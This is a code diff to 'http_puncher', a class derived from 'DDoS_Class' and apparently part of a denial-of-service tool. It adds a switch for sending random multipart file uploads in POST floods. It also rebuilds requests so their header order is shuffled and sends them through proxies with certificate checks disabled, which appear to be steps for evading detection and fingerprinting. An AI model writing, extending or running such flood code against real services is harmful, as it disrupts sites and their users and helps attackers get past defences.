@@ -4,6 +4,7 @@ class http_puncher(DDoS_Class):
     def __init__(
         self,
         u,
+        send_files=True,
         cookie=None,
         user_agents=None,
         method=3,
@@ -24,6 +25,7 @@ class http_puncher(DDoS_Class):
         if not self.user_agents or len(self.user_agents) == 0:
             self.user_agents = ua
         self.method = method
+        self.send_files=send_files
         self.stop = False
         self.counter = 0
         self.start = time.time()
@@ -120,15 +122,16 @@ class http_puncher(DDoS_Class):
                     if meth=='post':
                         data={}
                         files={}
-                        files_count=random.randint(0,3)
-                        for x in range(files_count):
-                            parameter_name_len=random.randint(1,15)
-                            parameter_name=''.join([random.choice(lis) for x in range(parameter_name_len)])
-                            file_name_len=random.randint(1,15)
-                            file_name=''.join([random.choice(lis) for x in range(file_name_len)])+'.'+random.choice(list(files_upload.keys()))
-                            file_content_len=random.randint(1,10240)
-                            file_content=''.join([random.choice(lis) for x in range(file_content_len)])+'.'+random.choice(list(files_upload.keys()))
-                            files.update({parameter_name:(file_name,file_content)})
+                        if self.send_files==True:
+                            files_count=random.randint(0,3)
+                            for x in range(files_count):
+                                parameter_name_len=random.randint(1,15)
+                                parameter_name=''.join([random.choice(lis) for x in range(parameter_name_len)])
+                                file_name_len=random.randint(1,15)
+                                file_name=''.join([random.choice(lis) for x in range(file_name_len)])+'.'+random.choice(list(files_upload.keys()))
+                                file_content_len=random.randint(1,10240)
+                                file_content=''.join([random.choice(lis) for x in range(file_content_len)])+'.'+random.choice(list(files_upload.keys()))
+                                files.update({parameter_name:(file_name,file_content)})
                         params_count=random.randint(0,5)
                         for x in range(params_count):
                             key_len=random.randint(0,15)
@@ -138,7 +141,18 @@ class http_puncher(DDoS_Class):
                             data.update({key:val})
                         if files=={}:
                             files=None
-                        req_session.post(url,data=data,files=files,proxies=proxy,timeout=self.timeout,verify=False,headers=headers)
+                        sess = requests.Session()
+                        req = requests.Request(
+                            method='POST', url=url, headers=headers, data=data, files=files, params={}
+                        )
+                        prep = req.prepare()
+                        prep.url = url
+                        header_keys = list(prep.headers.keys())
+                        random.shuffle(header_keys)
+                        post_headers = {key: prep.headers[key] for key in header_keys}
+                        prep.headers=OrderedDict(list(post_headers.items()))
+                        sess.send(prep, verify=False, proxies=proxy, timeout=self.timeout)
+                        #req_session.post(url,data=data,files=files,proxies=proxy,timeout=self.timeout,verify=False,headers=headers)
                     else:   
                         prm={}
                         params_count=random.randint(1,8)
